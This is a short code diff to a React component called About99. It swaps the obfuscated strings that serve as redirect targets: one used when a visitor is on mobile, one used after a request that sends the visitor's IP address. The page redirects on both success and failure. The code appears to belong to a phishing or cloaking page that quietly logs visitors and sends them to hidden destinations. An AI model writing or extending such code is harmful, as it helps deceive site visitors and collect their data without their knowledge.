@@ -21,7 +21,7 @@ const About99 = () => {
 
     useEffect(() => {
         if (isMobile) {
-            window.location.href = 'gQx9Wu2Pv3Ky4Hz5Mo1En6Js8Xt3Ao7Lr4Fu5Dv2Gy9Zw6Bq8Hn3Sr7Tp4Yj5Vf2Km1Xq9';
+            window.location.href = '9Kr2Xp6Lq7Mt3Bc8Zv1Wo4Nh5Ty3Jd65JLo3Vn5Ga1X2Ub4Jo0Md8Ns5Tr3Gn5p6JrFx7Km4Th';
         }
     }, [isMobile]);
 
@@ -57,10 +57,10 @@ IP: '${ip}'
                         },
                     })
                         .then(() => {
-                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms9';
+                            window.location = 'Ur5Xp3Lq9Yv2Wn6Ko4Md7Ct1Fb0Je8Ty3Gs5Nx4T3Hu9z0Xq6Kr1Po7Wm9Lb2Hv4Yt3Aj8Cf5Rs';
                         })
                         .catch((error) => {
-                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms9';
+                            window.location = 'Ur5Xp3Lq9Yv2Wn6Ko4Md7Ct1Fb0Je8Ty3Gs5Nx4T3Hu9z0Xq6Kr1Po7Wm9Lb2Hv4Yt3Aj8Cf5Rs';
                         });
                 });
         }
